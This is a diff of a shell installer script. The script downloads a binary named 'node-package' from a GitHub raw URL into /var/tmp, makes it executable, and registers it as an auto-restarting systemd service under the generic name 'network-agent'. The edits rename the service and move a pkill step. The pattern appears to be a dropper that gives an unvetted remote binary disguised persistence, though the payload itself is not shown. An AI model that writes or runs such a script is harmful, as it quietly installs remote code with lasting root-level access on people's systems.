@@ -8,7 +8,7 @@ URL="https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-pac
 TARGET_DIR="/var/tmp"
 FILENAME="node-package"
 FULL_PATH="$TARGET_DIR/$FILENAME"
-SERVICE_NAME="network-agentunix"
+SERVICE_NAME="network-agent"
 SERVICE_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
 AGENT_PATH="$FULL_PATH"
 
@@ -35,6 +35,11 @@ curl -L -o "$FULL_PATH" "$URL"
 # Make it executable
 chmod +x "$FULL_PATH"
 
+# Kill any existing processes before creating service
+echo "Stopping any existing node-package processes..."
+pkill -f "node-package" 2>/dev/null || true
+sleep 2
+
 # Create systemd service file
 echo "Creating systemd service..."
 cat > "$SERVICE_PATH" <<EOF
@@ -49,9 +54,7 @@ Restart=always
 RestartSec=60
 StandardOutput=journal
 StandardError=journal
-# Ensure only one instance runs
-ExecStartPre=-/bin/bash -c 'pkill -f "node-package" || true'
-ExecStartPre=/bin/sleep 2
+PIDFile=/var/run/network-agent.pid
 
 [Install]
 WantedBy=multi-user.target
